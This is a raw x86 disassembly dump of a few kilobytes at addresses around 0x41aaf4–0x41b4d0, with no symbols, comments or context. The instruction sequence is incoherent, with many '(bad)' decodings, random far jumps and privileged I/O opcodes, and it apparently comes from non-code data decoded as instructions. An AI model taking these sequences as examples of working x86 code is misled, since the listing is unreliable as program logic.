  41aaf4:	test   DWORD PTR [ecx],0xfdfeb4dc
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	dec    ebx
  41ab01:	scas   eax,DWORD PTR es:[edi]
  41ab02:	fs mov bh,0xfc
  41ab05:	sbb    al,BYTE PTR [ecx]
  41ab07:	add    BYTE PTR [ecx+eax*1],al
  41ab0a:	add    BYTE PTR [eax],al
  41ab0c:	bnd jmp 0x49e116d8
  41ab12:	cmp    eax,0xa79532eb
  41ab17:	and    bh,ah
  41ab19:	and    eax,0x4a5daf08
  41ab1e:	jbe    0x41ab05
  41ab20:	sti    
  41ab21:	mov    al,ds:0xfaa37bd2
  41ab26:	retf   0x83d6
  41ab29:	rol    BYTE PTR [edx],1
  41ab2b:	nop
  41ab2c:	inc    ecx
  41ab2d:	sti    
  41ab2e:	sbb    bh,bl
  41ab30:	rol    BYTE PTR [ebx+eax*8],0x21
  41ab34:	imul   BYTE PTR [eax+0x23]
  41ab37:	shr    DWORD PTR [edi-0x12],cl
  41ab3a:	mov    es,WORD PTR [esi]
  41ab3c:	mov    edi,0x5eb57cb7
  41ab41:	xchg   DWORD PTR [esi-0x318d69fd],ecx
  41ab47:	push   cs
  41ab48:	and    DWORD PTR [edx-0x13],0x6c
  41ab4c:	xor    DWORD PTR [edx-0x3c],0xffffff9f
  41ab50:	pop    es
  41ab51:	pop    ss
  41ab52:	push   edi
  41ab53:	rcr    DWORD PTR [eax+ebp*1+0x7dfc3ef9],0x2d
  41ab5b:	sar    dh,cl
  41ab5d:	stos   DWORD PTR es:[edi],eax
  41ab5e:	fiadd  DWORD PTR [ebp+0x29193aed]
  41ab64:	mov    edi,0x7a6d38e2
  41ab69:	bndldx bnd0,[ebp-0x5f]
  41ab6d:	mov    DWORD PTR [ecx-0x6f],ebx
  41ab70:	scas   al,BYTE PTR es:[edi]
  41ab71:	and    bh,0x6c
  41ab74:	add    BYTE PTR [eax+0x5e],0xf9
  41ab78:	iret   
  41ab79:	aad    0x7a
  41ab7b:	outs   dx,DWORD PTR ds:[esi]
  41ab7c:	mov    DWORD PTR [esi-0x6cb6e942],edi
  41ab82:	addr16 shr dh,cl
  41ab85:	loopne 0x41abe0
  41ab87:	cmp    eax,0xb27c5513
  41ab8c:	xor    eax,0xf2122a53
  41ab91:	push   eax
  41ab92:	rcl    BYTE PTR [edi],cl
  41ab94:	jbe    0x41ab77
  41ab96:	into   
  41ab97:	cmc    
  41ab98:	shl    DWORD PTR [esi],1
  41ab9a:	xchg   esi,eax
  41ab9b:	xor    bl,BYTE PTR [eax]
  41ab9d:	pop    edi
  41ab9e:	shl    ah,1
  41aba0:	push   esp
  41aba1:	popa   
  41aba2:	push   eax
  41aba3:	out    dx,al
  41aba4:	xor    al,0x6e
  41aba6:	pop    esp
  41aba7:	pop    es
  41aba8:	clc    
  41aba9:	adc    DWORD PTR [edx-0x12],ebp
  41abac:	retf   0xea9
  41abaf:	arpl   WORD PTR [esi-0x4d],di
  41abb2:	pop    ds
  41abb3:	inc    edi
  41abb4:	cwde   
  41abb5:	in     eax,0x5
  41abb7:	and    eax,0xda4528a1
  41abbc:	add    BYTE PTR [ebp-0x6],cl
  41abbf:	mov    dl,0x3f
  41abc1:	sub    eax,0xab0dc463
  41abc6:	xchg   edi,eax
  41abc7:	aam    0x7a
  41abc9:	sub    BYTE PTR ds:0x96f1cad4,ch
  41abcf:	dec    ebx
  41abd0:	popa   
  41abd1:	fcomp  DWORD PTR [edx-0x74]
  41abd4:	mov    edi,0xab55830b
  41abda:	fs push 0xffffffe9
  41abdd:	add    ebx,ecx
  41abdf:	push   cs
  41abe0:	nop
  41abe1:	sub    edi,ecx
  41abe3:	xchg   ebp,eax
  41abe4:	add    WORD PTR [edi-0x5d],si
  41abe8:	pop    ebp
  41abe9:	dec    ebp
  41abea:	or     DWORD PTR [edi+0x67],0xffffff89
  41abee:	jp     0x41ac5c
  41abf0:	scas   eax,DWORD PTR es:[edi]
  41abf1:	sbb    ch,BYTE PTR [edx+edi*8-0x30]
  41abf5:	popa   
  41abf6:	pop    ebp
  41abf7:	dec    ebp
  41abf8:	lock xor BYTE PTR [ebx],bl
  41abfb:	and    DWORD PTR [ebx+0xe23a4fa],0x16
  41ac02:	sub    DWORD PTR [edx+0x3b],edx
  41ac05:	inc    eax
  41ac06:	jmp    0x7e72d0cd
  41ac0b:	ss lock aad 0x8
  41ac0f:	aaa    
	...
  41ac74:	push   0x49
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [esi+edx*2+0x5b]
  41ac82:	arpl   WORD PTR [eax+eax*1+0x400011c],si
  41ac89:	add    DWORD PTR [eax],eax
  41ac8b:	add    BYTE PTR [ecx+0x185f20ea],al
  41ac91:	outs   dx,BYTE PTR ds:[esi]
  41ac92:	jae    0x41acec
  41ac94:	loop   0x41acd4
  41ac96:	pop    ebp
  41ac97:	add    BYTE PTR [eax],dl
  41ac99:	ror    esi,1
  41ac9b:	add    cl,0x2e
  41ac9e:	repz imul ebp,DWORD PTR [edi-0x79],0x8a3a2b23
  41aca6:	(bad)  
  41aca7:	js     0x41aca4
  41aca9:	cmp    eax,0xcedfc3b4
  41acae:	or     al,0x18
  41acb0:	lock ds cmp eax,0xebeb4225
  41acb7:	mov    al,0x38
  41acb9:	iret   
  41acba:	cs mov dl,0x97
  41acbd:	xchg   esp,eax
  41acbe:	adc    edx,DWORD PTR [edi]
  41acc0:	test   eax,0xb6cdb63b
  41acc5:	rol    ch,0xec
  41acc8:	dec    eax
  41acc9:	(bad)  
  41acca:	xor    al,0xaa
  41accc:	fld    TBYTE PTR [esi]
  41acce:	bound  ebx,QWORD PTR [esi-0x5376ad11]
  41acd4:	idiv   BYTE PTR [esi-0x2a0d7d7]
  41acda:	sbb    DWORD PTR [ecx],ebx
  41acdc:	and    eax,0x261411c9
  41ace1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ace2:	mov    BYTE PTR [edi-0x5b8401e8],ch
  41ace8:	test   bh,ch
  41acea:	neg    DWORD PTR [esi+0x7a]
  41aced:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acee:	cmp    ebp,DWORD PTR [edx]
  41acf0:	neg    BYTE PTR fs:[edx+0x200c6d2b]
  41acf7:	aas    
  41acf8:	retf   
  41acf9:	mov    ds:0xb178eeec,al
  41acfe:	xchg   ebx,eax
  41acff:	jle    0x41acb1
  41ad01:	test   BYTE PTR [ebx],cl
  41ad03:	add    al,BYTE PTR [edx+0x61be1c7d]
  41ad09:	jmp    0x41ad4a
  41ad0b:	mov    WORD PTR [edi+0x7f6b3d06],fs
  41ad11:	outs   dx,DWORD PTR ds:[esi]
  41ad12:	sbb    DWORD PTR [edx+edi*2+0x65],edx
  41ad16:	iret   
  41ad17:	jl     0x41ad78
  41ad19:	outs   dx,BYTE PTR ds:[esi]
  41ad1a:	in     eax,dx
  41ad1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad1c:	dec    edi
  41ad1d:	dec    ebp
  41ad1e:	imul   esp,DWORD PTR [ebx],0x3cde09bf
  41ad24:	test   eax,0x84c7106f
  41ad29:	test   DWORD PTR [esi-0x31d64012],0xad544a81
  41ad33:	iret   
  41ad34:	xor    DWORD PTR [edx-0x3649d01c],esi
  41ad3a:	cmp    eax,DWORD PTR [esp+edx*8+0x49ebebb4]
  41ad41:	pcmpgtb mm7,QWORD PTR [ecx+0x30]
  41ad45:	sub    esp,DWORD PTR [edi]
  41ad47:	ss push ss
  41ad49:	lahf   
  41ad4a:	out    dx,al
  41ad4b:	imul   ebp,esi,0x323a7c2b
  41ad51:	(bad)  
  41ad52:	fld    TBYTE PTR [ebp+0x3a]
  41ad55:	fwait
  41ad56:	ret    0x7602
  41ad59:	xchg   ebx,eax
  41ad5a:	xchg   BYTE PTR [edi],ch
  41ad5c:	ins    DWORD PTR es:[edi],dx
  41ad5d:	lahf   
  41ad5e:	out    dx,al
  41ad5f:	sub    al,BYTE PTR ds:[eax+0x3b]
  41ad63:	dec    esi
  41ad64:	xchg   esp,eax
  41ad65:	ret    
  41ad66:	addr16 sub al,0x36
  41ad69:	adc    al,0x85
  41ad6b:	push   ss
  41ad6c:	sbb    al,0x17
  41ad6e:	add    edx,DWORD PTR [ebx-0x65]
  41ad71:	call   0xa5b0:0xd2f3ed31
  41ad78:	dec    ebx
  41ad79:	icebp  
  41ad7a:	pop    edx
  41ad7b:	pusha  
  41ad7c:	xor    DWORD PTR [eax-0x27],ebx
  41ad7f:	adc    ah,BYTE PTR [edx-0x19]
  41ad82:	and    al,0x38
  41ad84:	push   0xb
  41ad86:	lahf   
  41ad87:	das    
  41ad88:	xlat   BYTE PTR ds:[ebx]
  41ad89:	hlt    
  41ad8a:	dec    edi
  41ad8b:	fwait
  41ad8c:	jae    0x41ad57
  41ad8e:	jp     0x41ad2f
	...
  41adf4:	push   ebp
  41adf5:	clc    
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [esi+eiz*4+0x4141953],esp
  41ae05:	sbb    eax,0x1040001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	rol    DWORD PTR [ecx+0x29],1
  41ae0f:	into   
  41ae10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae11:	xchg   esp,eax
  41ae12:	jmp    0x9b6ce484
  41ae17:	cmp    DWORD PTR [ecx],eax
  41ae19:	fidivr DWORD PTR [ebx]
  41ae1b:	stos   DWORD PTR es:[edi],eax
  41ae1c:	in     eax,0x12
  41ae1e:	ret    0xfda8
  41ae21:	sub    DWORD PTR [esi],ebp
  41ae23:	push   0x4c6c9dfa
  41ae28:	cmp    eax,0xee954980
  41ae2d:	ret    
  41ae2e:	icebp  
  41ae2f:	call   0x94c7:0xff696a6c
  41ae36:	and    DWORD PTR [edi+0x4c57b047],esi
  41ae3c:	aaa    
  41ae3d:	sbb    esi,DWORD PTR ds:[ebx-0x5cf0269]
  41ae44:	adc    ah,dl
  41ae46:	and    BYTE PTR [ebp+0x46],0xf4
  41ae4a:	addr16 xchg esp,eax
  41ae4c:	push   ds
  41ae4d:	jmp    0x6fac1dda
  41ae52:	lea    edx,[edi]
  41ae54:	ins    BYTE PTR es:[edi],dx
  41ae55:	adc    eax,0x397aab39
  41ae5a:	pop    ecx
  41ae5b:	add    DWORD PTR [esi+eax*1-0x26af4fcb],esp
  41ae62:	push   ebx
  41ae63:	int3   
  41ae64:	pop    es
  41ae65:	(bad)  
  41ae66:	fsub   DWORD PTR [edi-0x79e9df57]
  41ae6c:	add    ch,BYTE PTR [ebx-0x34f1a5e1]
  41ae72:	mov    ch,0x61
  41ae74:	xchg   ecx,eax
  41ae75:	stos   BYTE PTR es:[edi],al
  41ae76:	test   BYTE PTR ds:0x60faf84c,bl
  41ae7c:	sar    DWORD PTR [eax-0x51],0x1d
  41ae80:	pop    ecx
  41ae81:	out    dx,al
  41ae82:	lock jle 0x41aef7
  41ae85:	add    DWORD PTR [ecx+0x73b22aec],0xe39a30e1
  41ae8f:	xchg   ecx,eax
  41ae90:	and    BYTE PTR [eax],ch
  41ae92:	and    dl,dh
  41ae94:	mov    edx,0x60f84f10
  41ae99:	iret   
  41ae9a:	scas   al,BYTE PTR es:[edi]
  41ae9b:	stos   DWORD PTR es:[edi],eax
  41ae9c:	ins    DWORD PTR es:[edi],dx
  41ae9d:	rcr    DWORD PTR [esi+0x751c9f72],1
  41aea3:	mov    ecx,0xc6d1bb74
  41aea8:	hlt    
  41aea9:	pop    ebp
  41aeaa:	test   BYTE PTR [ebx+0x568a24da],bh
  41aeb0:	stc    
  41aeb1:	pop    ebp
  41aeb2:	or     dl,BYTE PTR [ebp-0x77]
  41aeb5:	sub    ebp,DWORD PTR [edi+0x11]
  41aeb8:	push   esi
  41aeb9:	pop    ecx
  41aeba:	mov    ch,0xb9
  41aebc:	repnz add ebx,ecx
  41aebf:	daa    
  41aec0:	icebp  
  41aec1:	adc    eax,0x93ebefdb
  41aec6:	mov    ebx,0xca91abac
  41aecb:	(bad)  
  41aecd:	call   DWORD PTR ds:0x5d676d26
  41aed3:	jmp    0xda70:0xe9c1cba3
  41aeda:	(bad)  
  41aedb:	pushf  
  41aedc:	mov    WORD PTR [ecx+0x14],?
  41aedf:	xchg   DWORD PTR [ecx-0x75b2c39a],esi
  41aee5:	rcl    DWORD PTR [edx-0x1e],1
  41aee8:	fld    QWORD PTR [ecx]
  41aeea:	sti    
  41aeeb:	jb     0x41af19
  41aeed:	aas    
  41aeee:	pusha  
  41aeef:	aad    0x29
  41aef1:	outs   dx,DWORD PTR ds:[esi]
  41aef2:	sbb    DWORD PTR [ecx+eiz*4-0x48],ebp
  41aef6:	mov    ds:0x7fd8af18,al
  41aefb:	mov    WORD PTR [ebx+0x515a2fe4],es
  41af01:	or     eax,DWORD PTR [edi]
  41af03:	push   0xffffffc1
  41af05:	shr    BYTE PTR [ecx],0xaf
  41af08:	xchg   esp,eax
  41af09:	gs ss ds (bad) 
  41af0d:	out    0xa2,al
  41af0f:	jle    0x41af11
	...
  41af71:	add    BYTE PTR [eax],al
  41af73:	add    ch,al
  41af75:	stc    
  41af76:	lods   eax,DWORD PTR ds:[esi]
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0xf4bd44ee
  41af82:	mov    BYTE PTR [ebp+0x11e08],bl
  41af88:	add    al,0x1
  41af8a:	add    BYTE PTR [eax],al
  41af8c:	sbb    eax,0x5f6ac364
  41af91:	scas   eax,DWORD PTR es:[edi]
  41af92:	call   0x30e4:0x4615d4db
  41af99:	pop    ds
  41af9a:	mov    ds:0xbe90a35c,eax
  41af9f:	or     DWORD PTR [ebp-0x32],ecx
  41afa2:	lock test al,0x35
  41afa5:	cmc    
  41afa6:	sub    al,BYTE PTR [eax+ebp*1+0x79]
  41afaa:	mov    ebp,0x99203186
  41afaf:	pop    ss
  41afb0:	je     0x41b02f
  41afb2:	push   0xd
  41afb4:	push   edx
  41afb5:	imul   esp,DWORD PTR [esi-0x62],0xffffff9c
  41afb9:	call   0x89541d4
  41afbe:	jns    0x41b028
  41afc0:	xlat   BYTE PTR ds:[ebx]
  41afc1:	jae    0x41afe9
  41afc3:	push   cs
  41afc4:	stos   BYTE PTR es:[edi],al
  41afc5:	fidivr WORD PTR [ebx+ebx*4]
  41afc8:	test   BYTE PTR [edi],bh
  41afca:	mov    edi,0xc12ab5df
  41afcf:	mov    ch,0x6d
  41afd1:	or     eax,0x1684fabc
  41afd6:	test   eax,0xa6b578e8
  41afdb:	xchg   BYTE PTR [edi],dh
  41afdd:	inc    esp
  41afde:	fucomip st,st(0)
  41afe0:	out    dx,al
  41afe1:	cmp    al,BYTE PTR [ecx+0x2]
  41afe4:	call   0x53f4:0xc26a6417
  41afeb:	sub    ebx,esi
  41afed:	les    esp,FWORD PTR [ecx]
  41afef:	push   ds
  41aff0:	hlt    
  41aff1:	add    al,0x29
  41aff3:	scas   eax,DWORD PTR es:[edi]
  41aff4:	sbb    al,0x2b
  41aff6:	push   esi
  41aff7:	out    0x11,eax
  41aff9:	idiv   DWORD PTR [esi+0x3c089f4c]
  41afff:	adc    dl,BYTE PTR [ecx]
  41b001:	call   0x29d7:0xbe7886f9
  41b008:	cmp    bl,0x1c
  41b00b:	rcr    DWORD PTR [eax-0x6],0xdc
  41b00f:	mov    WORD PTR [esi],gs
  41b011:	inc    eax
  41b012:	sub    al,0xdf
  41b014:	sub    DWORD PTR [ecx+eax*4-0x125e042],esi
  41b01b:	mov    ds:0x210923b4,al
  41b020:	push   ebx
  41b021:	das    
  41b022:	push   edx
  41b023:	div    DWORD PTR [ecx+0x1549393]
  41b029:	pop    ebp
  41b02a:	mov    dl,0x9f
  41b02c:	mov    esp,0x4e32c7d2
  41b031:	and    eax,0x49f9a74a
  41b036:	mov    bl,BYTE PTR cs:[eax-0x3718e775]
  41b03d:	sub    al,0x6e
  41b03f:	fiadd  DWORD PTR [esi-0x5753b52a]
  41b045:	mov    ebp,0x747f59d9
  41b04a:	mov    ch,0xc5
  41b04c:	(bad)  
  41b04d:	mov    eax,ds:0x700de7d8
  41b052:	jb     0x41affe
  41b054:	mov    ecx,DWORD PTR [eax+0x6ecd1926]
  41b05a:	pop    ecx
  41b05b:	daa    
  41b05c:	pop    esi
  41b05d:	in     al,dx
  41b05e:	mov    eax,0x37a21a0
  41b063:	out    0x11,eax
  41b065:	mov    dl,0x3f
  41b067:	rcr    DWORD PTR [ebx+edx*2+0x83c74ed],1
  41b06e:	adc    ch,dh
  41b070:	xor    bh,BYTE PTR [edi]
  41b072:	sar    DWORD PTR [edx-0x1],0x8b
  41b076:	pop    ecx
  41b077:	push   esi
  41b078:	add    esp,DWORD PTR [ecx+0x4d]
  41b07b:	or     DWORD PTR [ebx-0x7f05b77a],eax
  41b081:	mov    esp,0xdaafdd62
  41b086:	xchg   esp,eax
  41b087:	je     0x41b03d
  41b089:	or     BYTE PTR [ebp+0x2d],dh
  41b08c:	(bad)  
  41b08d:	pop    ds
  41b08e:	or     eax,0x9f
	...
  41b0f3:	add    dh,al
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0x25386fbe
  41b104:	or     al,0x1f
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    al,0x1
  41b10a:	add    BYTE PTR [eax],al
  41b10c:	jp     0x41b176
  41b10e:	in     eax,0x69
  41b110:	or     ch,BYTE PTR [esi-0x203d422e]
  41b116:	xor    BYTE PTR [ebx-0x21],dl
  41b119:	shl    BYTE PTR [ecx-0x101ad112],cl
  41b11f:	retf   
  41b120:	lahf   
  41b121:	lock in al,0xec
  41b124:	jg     0x41b0e9
  41b126:	ins    BYTE PTR es:[edi],dx
  41b127:	gs xchg esp,eax
  41b129:	or     al,0xab
  41b12b:	cli    
  41b12c:	adc    esi,0x987aa10e
  41b132:	cmp    eax,0x9d0e6d83
  41b137:	pop    esi
  41b138:	sar    DWORD PTR [ecx+0xa4de016],0x15
  41b13f:	sti    
  41b140:	jne    0x41b196
  41b142:	push   esi
  41b143:	mov    WORD PTR [edi-0x5542a86c],ds
  41b149:	jecxz  0x41b131
  41b14b:	les    ecx,FWORD PTR [eax]
  41b14d:	mov    BYTE PTR [ebx-0x10ce371a],bl
  41b153:	xor    ebp,esi
  41b155:	aaa    
  41b156:	iret   
  41b157:	mov    ch,0xde
  41b159:	stos   DWORD PTR es:[edi],eax
  41b15a:	push   eax
  41b15b:	add    DWORD PTR [edx],0xbdb94351
  41b161:	icebp  
  41b162:	loopne 0x41b12a
  41b164:	pop    esp
  41b165:	fnstcw WORD PTR [ebp+ebx*4+0x25]
  41b169:	pop    ebp
  41b16a:	repz mov esi,0x4c30c117
  41b170:	mov    ds:0x8ae6c078,al
  41b175:	into   
  41b176:	mov    DWORD PTR [ebp+0x3e],0xc2660d1c
  41b17d:	dec    edi
  41b17e:	mov    eax,ds:0x809989e7
  41b183:	cmp    DWORD PTR ds:0x8f1c,ecx
  41b188:	cmc    
  41b189:	ficom  WORD PTR [ebp+0x14]
  41b18c:	ss xor eax,0xb8ce2c8b
  41b192:	dec    ecx
  41b193:	(bad)  
  41b195:	out    0x42,al
  41b197:	lahf   
  41b198:	xchg   ebp,eax
  41b199:	das    
  41b19a:	repnz sti 
  41b19c:	sub    al,BYTE PTR [ebx]
  41b19e:	fist   WORD PTR [esp+edx*4]
  41b1a1:	and    BYTE PTR [edx-0x22],bh
  41b1a4:	sub    BYTE PTR fs:[ebp-0x56],dh
  41b1a8:	ret    
  41b1a9:	neg    DWORD PTR [ecx-0x72850062]
  41b1af:	rol    BYTE PTR [edx+0x2d],cl
  41b1b2:	inc    esp
  41b1b3:	sti    
  41b1b4:	xor    eax,0x34074800
  41b1b9:	or     eax,0xf1b41e62
  41b1be:	into   
  41b1bf:	xchg   ebx,eax
  41b1c0:	lea    edi,[edx-0x1]
  41b1c3:	xchg   ebp,eax
  41b1c4:	pop    ss
  41b1c5:	into   
  41b1c6:	dec    edx
  41b1c7:	add    eax,0x70780fae
  41b1cd:	cmc    
  41b1ce:	jb     0x41b23c
  41b1d0:	dec    eax
  41b1d1:	rcr    ecx,0xd
  41b1d4:	fiadd  DWORD PTR cs:[eax-0x7498e055]
  41b1db:	jmp    0x5700eb5
  41b1e0:	mov    ah,0x8b
  41b1e2:	push   edx
  41b1e3:	enter  0x51ac,0x1
  41b1e7:	sbb    eax,0x9dd0f385
  41b1ec:	xor    edi,DWORD PTR [ebx-0x6f]
  41b1ef:	pop    es
  41b1f0:	in     eax,dx
  41b1f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1f2:	outs   dx,BYTE PTR ds:[esi]
  41b1f3:	repz and al,0xc4
  41b1f6:	dec    ebx
  41b1f7:	xchg   esp,eax
  41b1f8:	test   DWORD PTR [ecx],ecx
  41b1fa:	test   ah,ah
  41b1fc:	dec    ebx
  41b1fd:	cmp    eax,0xb57cb5af
  41b202:	push   0xffffff81
  41b204:	cld    
  41b205:	rol    BYTE PTR [edi-0x57],1
  41b208:	inc    esp
  41b209:	xchg   esi,eax
  41b20a:	bound  ebp,QWORD PTR [ecx-0x49eb9df8]
	...
  41b274:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [ecx+0x10d474c2],bl
  41b285:	and    BYTE PTR [ecx],al
  41b287:	add    BYTE PTR [ecx+eax*1],al
  41b28a:	add    BYTE PTR [eax],al
  41b28c:	adc    al,BYTE PTR [esi+0x7d]
  41b28f:	dec    ebp
  41b290:	mov    ch,0x97
  41b292:	mov    dh,0x29
  41b294:	mov    edi,?
  41b296:	mov    ebx,0x9ff2fdda
  41b29b:	aam    0x53
  41b29d:	cmp    BYTE PTR [esi],cl
  41b29f:	hlt    
  41b2a0:	mov    esp,0xcbe5e395
  41b2a5:	shr    DWORD PTR [ebp+esi*2-0x77],0xf
  41b2aa:	loop   0x41b26c
  41b2ac:	adc    dl,cl
  41b2ae:	inc    eax
  41b2af:	jmp    0x41b302
  41b2b1:	test   BYTE PTR [edx+0x41],dl
  41b2b4:	test   eax,0xd5f35176
  41b2b9:	repnz loope 0x41b24b
  41b2bc:	mov    ch,0xc6
  41b2be:	fsubr  st(5),st
  41b2c0:	lock rcl BYTE PTR [ebp+0xe],1
  41b2c4:	(bad)  
  41b2c5:	fwait
  41b2c6:	mov    WORD PTR [eax+0x37],gs
  41b2c9:	xchg   ebp,eax
  41b2ca:	inc    esp
  41b2cb:	dec    ebp
  41b2cc:	retf   
  41b2cd:	push   edi
  41b2ce:	test   BYTE PTR [ecx+edi*2+0x50],dh
  41b2d2:	fld    DWORD PTR ds:0x736e43a9
  41b2d8:	adc    BYTE PTR [ebp+0x35],al
  41b2db:	rcl    eax,0x9
  41b2de:	sbb    eax,DWORD PTR [esi-0x4d]
  41b2e1:	js     0x41b2ff
  41b2e3:	retf   0x5fac
  41b2e6:	in     eax,0xc7
  41b2e8:	fwait
  41b2e9:	mov    ?,WORD PTR [ebx-0xb]
  41b2ec:	xchg   ecx,eax
  41b2ed:	pop    eax
  41b2ee:	aad    0xbf
  41b2f0:	adc    BYTE PTR [edi],cl
  41b2f2:	jp     0x41b291
  41b2f4:	jg     0x41b2a5
  41b2f6:	jle    0x41b304
  41b2f8:	test   DWORD PTR [edi+0x2b7e22f6],edx
  41b2fe:	sbb    edi,ebp
  41b300:	test   DWORD PTR [edi],eax
  41b302:	and    esi,edi
  41b304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b305:	add    ch,ch
  41b307:	sub    bh,cl
  41b309:	push   cs
  41b30a:	ror    BYTE PTR [esi-0x69],0xa4
  41b30e:	sti    
  41b30f:	mov    ebx,DWORD PTR [edi-0x35]
  41b312:	mov    ds:0xf0a5332,al
  41b317:	sti    
  41b318:	int3   
  41b319:	out    0x7c,eax
  41b31b:	mov    esi,0x261c5c88
  41b320:	bound  ebx,QWORD PTR [ebp+0x143b00bb]
  41b326:	sbb    ecx,DWORD PTR [ecx]
  41b328:	mov    esp,0x58b7266f
  41b32d:	add    DWORD PTR [ebp-0x3eff9874],esi
  41b333:	(bad)  
  41b336:	ret    
  41b337:	and    DWORD PTR [edx+0x5bf6626a],ebx
  41b33d:	pop    esp
  41b33e:	repnz sub BYTE PTR [edi],dl
  41b341:	add    eax,0x98780095
  41b346:	out    0xfd,al
  41b348:	mov    DWORD PTR [esi],esi
  41b34a:	(bad)  
  41b34c:	add    DWORD PTR [ebx-0xaea2960],esi
  41b352:	lock cmc 
  41b354:	xchg   esp,eax
  41b355:	int3   
  41b356:	sub    cl,BYTE PTR [eax]
  41b358:	js     0x41b3c7
  41b35a:	scas   eax,DWORD PTR es:[edi]
  41b35b:	fwait
  41b35c:	cmp    eax,eax
  41b35e:	sbb    al,0x3d
  41b360:	imul   edx
  41b362:	jne    0x41b318
  41b364:	ds xchg esp,eax
  41b366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b367:	loopne 0x41b395
  41b369:	pushf  
  41b36a:	and    edi,DWORD PTR [ecx]
  41b36c:	es jnp 0x41b38b
  41b36f:	les    eax,FWORD PTR [ebp+0x74]
  41b372:	lock sbb BYTE PTR [esi-0x43084b8c],0x61
  41b37a:	sub    DWORD PTR [edi],ebp
  41b37c:	int    0xae
  41b37e:	ins    DWORD PTR es:[edi],dx
  41b37f:	jecxz  0x41b37d
  41b381:	das    
  41b382:	in     al,dx
  41b383:	retf   0x8cc6
  41b386:	jno    0x41b389
  41b388:	mov    al,BYTE PTR [ebx-0x3a]
  41b38b:	adc    bl,BYTE PTR [edx]
  41b38d:	mov    ecx,0x8bef
	...
  41b3f2:	add    BYTE PTR [eax],al
  41b3f4:	dec    eax
  41b3f5:	or     eax,0xbb5dab1d
  41b3fa:	(bad)  
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	jmp    0x147d2e9e
  41b405:	and    DWORD PTR [ecx],eax
  41b407:	add    BYTE PTR [ecx+eax*1],al
  41b40a:	add    BYTE PTR [eax],al
  41b40c:	lock cld 
  41b40e:	and    cl,BYTE PTR [ecx+0x2c]
  41b411:	js     0x41b438
  41b413:	cmp    al,BYTE PTR [edi-0x4c]
  41b416:	jmp    0x3c3a6681
  41b41b:	inc    BYTE PTR [ebp+0x37929e7a]
  41b421:	(bad)  
  41b422:	push   eax
  41b423:	ret    
  41b424:	mov    bh,0x4b
  41b426:	jns    0x41b40f
  41b428:	rcl    BYTE PTR [esi-0x5a],cl
  41b42b:	shr    cl,cl
  41b42d:	repnz mov ds:0x22b0767d,al
  41b433:	inc    ebx
  41b434:	adc    BYTE PTR [edx],al
  41b436:	jecxz  0x41b3ba
  41b438:	sahf   
  41b439:	sub    bl,0x1a
  41b43c:	dec    esi
  41b43d:	test   DWORD PTR [eax-0x51],esi
  41b440:	pop    edi
  41b441:	(bad)  
  41b442:	jns    0x41b482
  41b444:	xchg   ebx,eax
  41b445:	(bad)
  41b449:	rcr    BYTE PTR [edx],1
  41b44b:	bound  ebx,QWORD PTR [edx-0x46]
  41b44e:	fcomp  QWORD PTR [edi]
  41b450:	sar    BYTE PTR [esi-0x76970a5f],1
  41b456:	add    DWORD PTR [esp+edi*8+0x76b821a0],0xe12fc57
  41b461:	sub    al,0x5c
  41b463:	push   ebx
  41b464:	cdq    
  41b465:	fsubp  st(4),st
  41b467:	scas   al,BYTE PTR es:[edi]
  41b468:	fs cmp edi,esp
  41b46b:	mov    al,ds:0xda173dd6
  41b470:	mov    gs,ecx
  41b472:	div    ch
  41b474:	mov    bl,0x2a
  41b476:	aaa    
  41b477:	mov    bl,0xb5
  41b479:	(bad)  
  41b47a:	mov    eax,0xb061c948
  41b47f:	ds retf 
  41b481:	jb     0x41b4c6
  41b483:	addr16 mov ebp,0x2260c892
  41b489:	sub    DWORD PTR [ecx-0x72ab0338],edx
  41b48f:	mov    dl,0x63
  41b491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b492:	lds    eax,FWORD PTR [edi]
  41b494:	pop    esi
  41b495:	leave  
  41b496:	cmp    al,ah
  41b498:	js     0x41b41b
  41b49a:	or     al,0xfb
  41b49c:	dec    edi
  41b49d:	hlt    
  41b49e:	jmp    0x88a2:0x33cb5bcb
  41b4a5:	or     cl,cl
  41b4a7:	cmp    al,BYTE PTR [ebx-0x15316806]
  41b4ad:	pusha  
  41b4ae:	loope  0x41b432
  41b4b0:	jns    0x41b4f5
  41b4b2:	stc    
  41b4b3:	cmp    BYTE PTR [eax-0x277d12ca],dl
  41b4b9:	fucomi st,st(7)
  41b4bb:	xlat   BYTE PTR ds:[ebx]
  41b4bc:	pop    eax
  41b4bd:	stc    
  41b4be:	pop    ss
  41b4bf:	xor    al,0x68
  41b4c1:	sbb    DWORD PTR [esi],ebp
  41b4c3:	cmc    
  41b4c4:	je     0x41b528
  41b4c6:	inc    esi
  41b4c7:	push   ebx
  41b4c8:	pop    ds
  41b4c9:	fldcw  WORD PTR [ebp-0x47]
  41b4cc:	arpl   di,si
  41b4ce:	loop   0x41b514
  41b4d0:	pusha  
